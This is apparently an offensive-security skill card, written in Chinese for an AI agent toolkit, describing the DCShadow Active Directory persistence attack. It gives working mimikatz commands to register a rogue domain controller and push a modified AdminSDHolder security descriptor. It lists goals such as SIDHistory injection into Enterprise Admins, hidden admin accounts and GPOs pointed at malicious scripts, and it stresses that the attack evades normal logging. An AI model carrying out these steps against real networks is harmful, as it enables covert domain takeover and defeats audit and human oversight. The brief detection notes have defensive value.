---
name: 'dcshadow'
description: 'DCShadow：注册rogue DC→通过DRSUAPI推送恶意AD变更→绕过日志。需DA权限。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。

## DCShadow — 无日志域持久化

### 原理
DA 权限 → 注册一个临时"DC" → 通过 DRSUAPI 复制协议直接向其他 DC 推送恶意 AD 变更，绕过常规日志。可推送 SIDHistory、AdminSDHolder ACE、组成员变更等。

### 利用（需要 DA）
```bash
# 1. 注册 rogue DC
mimikatz.exe "lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=domain,DC=local /attribute:ntSecurityDescriptor /value:<NEW_SD>" "exit"

# 2. 在另一会话中触发复制（或等待自动复制）
mimikatz.exe "lsadump::dcshadow /push" "exit"
```text

### 常见用法
- 给 AdminSDHolder 添加 ACE → 60 分钟后全局传播
- 给自己注入 SIDHistory (Enterprise Admins)
- 创建隐藏的管理账户
- 修改 GPO 指向恶意脚本

### 前提
- Domain Admin 或同等权限
- 目标 DC 的 SYSTEM（LDAPS 连接）

### 检测难点
- 不走常规 LDAP 修改日志（4662 等）
- 不走 DCSync 日志（4662 for DS-Replication-*）
- 只能通过 RPC/DRSUAPI 流量异常检测

### 清理
- DCShadow 做的修改是**真实持久**的，需要手动回滚（移除 ACE/删除账户）
